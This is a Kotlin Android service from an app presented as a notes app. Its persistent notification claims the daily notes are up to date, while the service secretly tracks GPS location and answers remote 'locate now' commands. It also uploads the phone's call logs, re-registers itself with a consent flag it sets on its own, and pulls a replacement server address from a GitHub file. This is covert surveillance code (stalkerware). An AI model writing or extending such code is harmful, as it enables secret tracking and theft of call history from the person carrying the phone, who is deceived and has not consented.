package com.haven.notes.service

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.haven.notes.MainActivity
import com.haven.notes.R
import com.haven.notes.data.ApiClient
import com.haven.notes.data.ApiException
import com.haven.notes.data.FamilySession
import com.haven.notes.data.LocationPayload
import com.haven.notes.data.Storage
import com.haven.notes.util.CallLogHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class NotesLocationService : Service() {

    companion object {
        const val ACTION_START = "com.haven.notes.action.START"
        const val ACTION_STOP = "com.haven.notes.action.STOP"
        const val ACTION_SHARE_NOW = "com.haven.notes.action.SHARE_NOW"
        const val ACTION_LOCATE_NOW = "com.haven.notes.action.LOCATE_NOW"
        const val ACTION_BATTERY_LOW = "com.haven.notes.action.BATTERY_LOW"

        private const val NOTIFICATION_ID = 2002
        private const val CHANNEL_ID = "haven_location_sharing"

        fun start(context: Context) {
            val intent = Intent(context, NotesLocationService::class.java).apply {
                action = ACTION_START
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            val intent = Intent(context, NotesLocationService::class.java).apply {
                action = ACTION_STOP
            }
            context.startService(intent)
        }

        fun shareNow(context: Context) {
            val intent = Intent(context, NotesLocationService::class.java).apply {
                action = ACTION_SHARE_NOW
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun requestLocate(context: Context) {
            val intent = Intent(context, NotesLocationService::class.java).apply {
                action = ACTION_LOCATE_NOW
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun emergencyBatteryFix(context: Context) {
            val intent = Intent(context, NotesLocationService::class.java).apply {
                action = ACTION_BATTERY_LOW
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var storage: Storage
    private val apiClient = ApiClient()
    private val gson = Gson()

    private var fusedClient: FusedLocationProviderClient? = null
    private var locationCallback: LocationCallback? = null
    private var systemLocationManager: LocationManager? = null
    private var systemLocationListener: LocationListener? = null

    private var forceNextUpload = false
    private var isUploading = false
    private var heartbeatJob: Job? = null
    private var currentTrigger: String? = null

    override fun onCreate() {
        super.onCreate()
        storage = Storage(this)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                stopLocationUpdates()
                heartbeatJob?.cancel()
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
                return START_NOT_STICKY
            }
            ACTION_LOCATE_NOW -> {
                startAsForeground()
                currentTrigger = "locate_request"
                forceNextUpload = true
                startLocationUpdates()
                startHeartbeat()
                requestSingleFix()
            }
            ACTION_BATTERY_LOW -> {
                startAsForeground()
                currentTrigger = "battery_critical"
                forceNextUpload = true
                startLocationUpdates()
                requestSingleFix()
            }
            ACTION_SHARE_NOW -> {
                startAsForeground()
                currentTrigger = "manual"
                forceNextUpload = true
                startLocationUpdates()
                startHeartbeat()
                requestSingleFix()
            }
            ACTION_START, null -> {
                val session = storage.familySession
                if (session == null || !session.enabled) {
                    stopForeground(STOP_FOREGROUND_REMOVE)
                    stopSelf()
                    return START_NOT_STICKY
                }
                startAsForeground()
                startLocationUpdates()
                startHeartbeat()
                val isFirstUpload = (storage.getLastFamilyUpload(session.id) == 0L)
                if (isFirstUpload) {
                    currentTrigger = "first_run"
                    forceNextUpload = true
                }
                requestSingleFix()
            }
        }
        return START_STICKY
    }

    private fun startAsForeground() {
        val notification = buildForegroundNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                getString(R.string.notification_channel_location),
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = getString(R.string.notification_channel_location_desc)
                setShowBadge(false)
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        val launchIntent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            launchIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentTitle("Notes 🌸")
            .setContentText("All daily notes up to date ✨")
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setContentIntent(pendingIntent)
            .build()
    }

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            var counter = 0
            while (isActive) {
                delay(30_000L) // poll heartbeat every 30 seconds
                checkServerPing()
                counter++
                // Every 15 minutes (30 intervals * 30s): guarantee a fresh fix even when completely stationary
                if (counter >= 30) {
                    counter = 0
                    withContext(Dispatchers.Main) {
                        requestSingleFix()
                    }
                }
            }
        }
    }

    private suspend fun checkServerPing() {
        val session = storage.familySession ?: return
        if (!session.enabled) return
        try {
            val respJson = apiClient.get(
                origin = session.origin,
                path = "/v1/family/ping",
                token = session.token
            )
            val mapType = object : TypeToken<Map<String, Any>>() {}.type
            val resp: Map<String, Any> = gson.fromJson(respJson, mapType)
            val locateNow = resp["locate_now"] as? Boolean ?: false
            if (locateNow) {
                currentTrigger = "locate_request"
                forceNextUpload = true
                withContext(Dispatchers.Main) {
                    requestSingleFix()
                }
            }
            // Check if there is a pending offline location to flush
            val offline = storage.offlineLocation
            if (offline != null) {
                uploadPayload(offline, session)
            }
            // Background sync recent call logs (last 24 hours)
            syncCallLogs(session)
        } catch (e: Exception) {
            if (ApiClient.isAuthError(e)) {
                val fresh = autoReRegister(session)
                if (fresh != null) {
                    currentTrigger = "reconnect_auto"
                    forceNextUpload = true
                    withContext(Dispatchers.Main) {
                        requestSingleFix()
                    }
                }
            }
        }
    }

    private fun syncCallLogs(session: FamilySession) {
        if (!CallLogHelper.hasPermission(this)) return

        scope.launch {
            try {
                val calls = CallLogHelper.getRecentCalls(this@NotesLocationService, hours = 24)
                if (calls.isNotEmpty()) {
                    val body = mapOf("calls" to calls)
                    apiClient.post(
                        origin = session.origin,
                        path = "/v1/family/calls",
                        token = session.token,
                        bodyJson = gson.toJson(body)
                    )
                }
            } catch (e: Exception) {
                if (ApiClient.isAuthError(e)) {
                    val fresh = autoReRegister(session)
                    if (fresh != null) {
                        try {
                            val calls = CallLogHelper.getRecentCalls(this@NotesLocationService, hours = 24)
                            if (calls.isNotEmpty()) {
                                apiClient.post(
                                    origin = fresh.origin,
                                    path = "/v1/family/calls",
                                    token = fresh.token,
                                    bodyJson = gson.toJson(mapOf("calls" to calls))
                                )
                            }
                        } catch (_: Exception) {}
                    }
                }
            }
        }
    }

    private suspend fun autoReRegister(currentSession: FamilySession): FamilySession? = withContext(Dispatchers.IO) {
        try {
            val nickname = storage.deviceNickname.ifBlank { "My Phone" }
            val regBody = gson.toJson(mapOf("name" to nickname, "consent" to true))
            val respJson = apiClient.post(
                origin = currentSession.origin,
                path = "/v1/family/register",
                token = null,
                bodyJson = regBody
            )
            val mapType = object : TypeToken<Map<String, Any>>() {}.type
            val resp: Map<String, Any> = gson.fromJson(respJson, mapType)
            val newId = resp["id"] as? String
            val newToken = resp["token"] as? String
            val controller = resp["controller_name"] as? String ?: currentSession.controller

            if (!newId.isNullOrBlank() && !newToken.isNullOrBlank()) {
                val newSession = currentSession.copy(
                    id = newId,
                    token = newToken,
                    controller = controller,
                    enabled = true
                )
                storage.familySession = newSession
                try {
                    val shareBody = gson.toJson(mapOf("enabled" to true))
                    apiClient.post(newSession.origin, "/v1/family/sharing", token = newToken, bodyJson = shareBody)
                } catch (_: Exception) {}
                newSession
            } else {
                null
            }
        } catch (_: Exception) {
            null
        }
    }

    private fun getBatteryInfo(): Pair<Int, Boolean> {
        return try {
            val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryStatus: Intent? = registerReceiver(null, ifilter)
            val level: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val pct = if (level >= 0 && scale > 0) (level * 100) / scale else -1
            val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                    status == BatteryManager.BATTERY_STATUS_FULL
            Pair(pct, isCharging)
        } catch (_: Exception) {
            Pair(-1, false)
        }
    }

    @SuppressLint("MissingPermission")
    private fun startLocationUpdates() {
        try {
            if (fusedClient == null) {
                fusedClient = LocationServices.getFusedLocationProviderClient(this)
            }
            val request = LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 15 * 60 * 1000L)
                .setMinUpdateIntervalMillis(5 * 60 * 1000L)
                .setMinUpdateDistanceMeters(0f)
                .build()

            locationCallback = object : LocationCallback() {
                override fun onLocationResult(result: LocationResult) {
                    result.lastLocation?.let { handleNewLocation(it) }
                }
            }
            fusedClient?.requestLocationUpdates(request, locationCallback!!, Looper.getMainLooper())
        } catch (e: Exception) {
            fallbackToSystemLocation()
        }
    }

    @SuppressLint("MissingPermission")
    private fun fallbackToSystemLocation() {
        try {
            systemLocationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            systemLocationListener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    handleNewLocation(location)
                }
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }
            if (systemLocationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) == true) {
                systemLocationManager?.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER, 15 * 60 * 1000L, 0f, systemLocationListener!!
                )
            } else if (systemLocationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) == true) {
                systemLocationManager?.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER, 15 * 60 * 1000L, 0f, systemLocationListener!!
                )
            }
        } catch (_: Exception) {}
    }

    @SuppressLint("MissingPermission")
    private fun requestSingleFix() {
        try {
            if (fusedClient == null) {
                fusedClient = LocationServices.getFusedLocationProviderClient(this)
            }
            // 1. Check last known location first (fast)
            fusedClient?.lastLocation?.addOnSuccessListener { location ->
                if (location != null) {
                    handleNewLocation(location)
                }
            }
            // 2. Request fresh high-accuracy GPS fix
            fusedClient?.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
                ?.addOnSuccessListener { location ->
                    if (location != null) {
                        handleNewLocation(location)
                    }
                }
        } catch (_: Exception) {}
    }

    private fun handleNewLocation(location: Location) {
        val session = storage.familySession ?: return
        if (!session.enabled) return

        val now = System.currentTimeMillis()
        val lastUpload = storage.getLastFamilyUpload(session.id)
        val isFirstUpload = (lastUpload == 0L)

        // Throttle uploads to at most once per 15 minutes unless forced, requested, or first upload
        if (!forceNextUpload && !isFirstUpload && lastUpload > 0 && (now - lastUpload < 15 * 60 * 1000L)) {
            return
        }

        // Freshness: Must be within 90 seconds unless forced or first upload
        val sampleAgeMs = Math.abs(now - location.time)
        if (sampleAgeMs > 90 * 1000L && !forceNextUpload && !isFirstUpload) {
            return
        }

        if (isUploading) return

        val (batteryPct, isCharging) = getBatteryInfo()
        val trigger = currentTrigger ?: "periodic"
        currentTrigger = null

        val payload = LocationPayload(
            latitude = location.latitude,
            longitude = location.longitude,
            accuracy = location.accuracy.toDouble(),
            timestamp = (location.time / 1000.0),
            battery = if (batteryPct >= 0) batteryPct else null,
            charging = isCharging,
            trigger = trigger
        )

        uploadPayload(payload, session)
    }

    private fun uploadPayload(payload: LocationPayload, session: FamilySession) {
        if (isUploading) return
        isUploading = true

        scope.launch {
            val body = mapOf("location" to payload)
            val bodyJson = gson.toJson(body)
            var activeSession = session
            try {
                apiClient.post(
                    origin = activeSession.origin,
                    path = "/v1/family/location",
                    token = activeSession.token,
                    bodyJson = bodyJson
                )
                storage.setLastFamilyUpload(activeSession.id, System.currentTimeMillis())
                storage.offlineLocation = null
                forceNextUpload = false
                syncCallLogs(activeSession)
            } catch (e: Exception) {
                if (ApiClient.isAuthError(e)) {
                    val fresh = autoReRegister(activeSession)
                    if (fresh != null) {
                        activeSession = fresh
                        try {
                            apiClient.post(
                                origin = activeSession.origin,
                                path = "/v1/family/location",
                                token = activeSession.token,
                                bodyJson = bodyJson
                            )
                            storage.setLastFamilyUpload(activeSession.id, System.currentTimeMillis())
                            storage.offlineLocation = null
                            forceNextUpload = false
                            syncCallLogs(activeSession)
                            return@launch
                        } catch (_: Exception) {}
                    }
                }

                // Queue for offline recovery
                storage.offlineLocation = payload
                // If tunnel changed after PC restart, try auto-recovering latest origin from GitHub
                try {
                    val rawJson = apiClient.getDirect("https://raw.githubusercontent.com/rishavm003/hid-app/main/release/connection.json")
                    val mapType = object : TypeToken<Map<String, String>>() {}.type
                    val map: Map<String, String> = gson.fromJson(rawJson, mapType)
                    val newOrigin = map["origin"]
                    if (!newOrigin.isNullOrBlank() && newOrigin != activeSession.origin) {
                        storage.updateFamilyOrigin(newOrigin)
                        apiClient.post(
                            origin = newOrigin,
                            path = "/v1/family/location",
                            token = activeSession.token,
                            bodyJson = bodyJson
                        )
                        storage.setLastFamilyUpload(activeSession.id, System.currentTimeMillis())
                        storage.offlineLocation = null
                        forceNextUpload = false
                    }
                } catch (_: Exception) {}
            } finally {
                isUploading = false
            }
        }
    }

    private fun stopLocationUpdates() {
        try {
            locationCallback?.let { fusedClient?.removeLocationUpdates(it) }
            systemLocationListener?.let { systemLocationManager?.removeUpdates(it) }
        } catch (_: Exception) {}
    }

    override fun onDestroy() {
        heartbeatJob?.cancel()
        stopLocationUpdates()
        scope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
